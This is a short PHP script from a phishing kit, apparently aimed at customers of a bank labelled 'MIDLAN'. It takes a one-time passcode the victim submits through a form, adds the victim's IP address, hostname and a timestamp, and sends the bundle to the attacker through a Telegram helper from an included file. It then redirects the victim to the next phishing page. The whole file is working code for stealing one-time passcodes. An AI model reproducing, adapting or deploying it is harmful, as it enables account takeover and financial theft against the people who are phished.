<?php
include("tlgrm.php");
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$hostname = gethostbyaddr($ip);

    $message = "🔥 MIDLAN 💰\n";
    $message .= "🔒OTP:\n ".$_POST['code']."\n";
    $message.="-------= IP Address & Date =-------- \n";
    $message .= "ℹ️ IP INFO: $ip\n";
    $message .= "📆TIME/DATE: $date\n";
    $message .= " 🥷🥷G 1 N G🥷🥷  \n";
telegram($message);
sleep(1);
echo "<meta http-equiv='refresh' content='0; url=load2.php'/>";

?>